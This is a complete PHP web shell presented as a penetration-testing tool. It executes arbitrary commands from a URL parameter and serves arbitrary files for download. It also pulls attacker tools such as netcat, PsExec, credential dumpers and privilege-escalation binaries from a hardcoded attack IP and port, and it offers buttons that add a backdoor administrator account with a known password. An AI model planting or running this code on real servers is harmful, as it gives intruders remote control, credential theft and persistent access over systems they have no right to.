<?php
$attackip = "10.0.2.6";
$attackport = "8000";
echo '<!doctype html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
<title>The Not-So Simple Command Shell by KaotickJ</title>
</head>
<body>
<div style="border:1px solid #333;width:50%;padding:0px 30px;border-radius:10px;margin:10px 40px;">
<h4 style="">The Not So Simple Command Shell</h4>
<form action="" method="get">Command? <input type="text" name="cmd" autofocus/>
<button type="submit">Execute</button></form>
<p>File Options</p>
<form action="" method="get">
<select name="upload">
<option>Choose</option>
<option value="DRWransomWareDecryptor.exe">DRW Ransomware Decryptor</option>
<option value="jaws-enum.ps1">JAWs Enum</option>
<option value="ms15-05164.exe">MS15-051 Priv Esc</option>
<option value="nc.exe">Netcat 32</option>
<option value="nc64.exe">Netcat 64</option>
<option value="PsExec.exe">PsExec</option>
<option value="PsInfo.exe">PsInfo</option>
<option value="pspasswd.exe">PsPasswd</option>
<option value="PowerUp.ps1">PowerUp.ps1</option>
<option value="RansomwareFileDecryptor.exe">Ransomware File Decryptor (TrendMicro)</option>
<option value="Taihou64.exe">Taihou 15-1701 PrivEsc</option>
<option value="venom.exe">VENOM.EXE</option>
<option value="wce32.exe">WCE 32</option>
<option value="wce64.exe">WCE 64</option>
<option value="wce-universal.exe">WCE Universal</option>
</select><button type="submit">Upload</button>
</form>
<p><or enter filename></p>
<form action="" method="get" enctype="multipart/form-data"><input name="upload" type="file" placeholder="File to Upload"/><button type="submit">Upload</button></form>&nbsp;<form action="" method="get"><input type="text" name="download" placeholder="File to Download"/><button type="submit" title="downloads file to attack machine">Download</button></form>
<br>
<form action="" method="get">
<p>Quick Enum Options</p>
<button type="submit" name="cmd" value="systeminfo" title="runs systeminfo command">System Info</button>&nbsp;<button type="submit" name="cmd" value="whoami" title="shows current user">Whoami</button>&nbsp<button type="submit" name="cmd" value="echo %username%" title="another option to display current user">Username</button>&nbsp;<button type="submit" name="cmd" value="whoami /all" title="gives current user information">User Info</button>&nbsp;<button type="submit" name="cmd" value="net user" title="lists all users">All Users</button><br><br><button type="submit" name="cmd" value="tasklist">Processes</button>&nbsp<button type="submit" name="cmd" value="net user kaotickj kali /add" title="adds user kaotickj with password kali. only works with sufficient permissions on the current user">Add User</button>&nbsp;<button type="submit" name="cmd" value="net localgroup administrators kaotickj /add" title="sets kaotickj as adminstrative user. only works with sufficient permissions on the current user">Set Admin</button>&nbsp;<button type="submit" name="cmd" value="net user kaotickj /del" title="deletes kaotickj from the system">DelUser</button>
<button onClick="window.location.reload();">Clear Console</button>
</form>
<p style=""><small>The Not-So Simple Command Shell - Courtesy of KaotickJ</small></p>
</div>';

if(isset($_GET['download'])) {
	$filename = $_GET['download'];
	if(file_exists($filename)) {
		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header("Cache-Control: no-cache, must-revalidate");
		header("Expires: 0");
		header('Content-Disposition: attachment; filename="'.basename($filename).'"');
		header('Content-Length: ' . filesize($filename));
		header('Pragma: public');
		flush();
		readfile($filename);
		die();
	}
	else{
		echo "Resource not found.";
	}
}

if (isset($_GET['upload'])) {
	if($_GET['upload'] == "Choose") die('You must choose a file to upload first.');
	file_put_contents($_GET['upload'], file_get_contents("http://".$attackip.":".$attackport."/" .$_GET['upload']));
}

if (isset($_GET['cmd'])) {
	echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
	echo (system($_GET['cmd']));
	echo '</pre>';
}
?>
</body>
</html>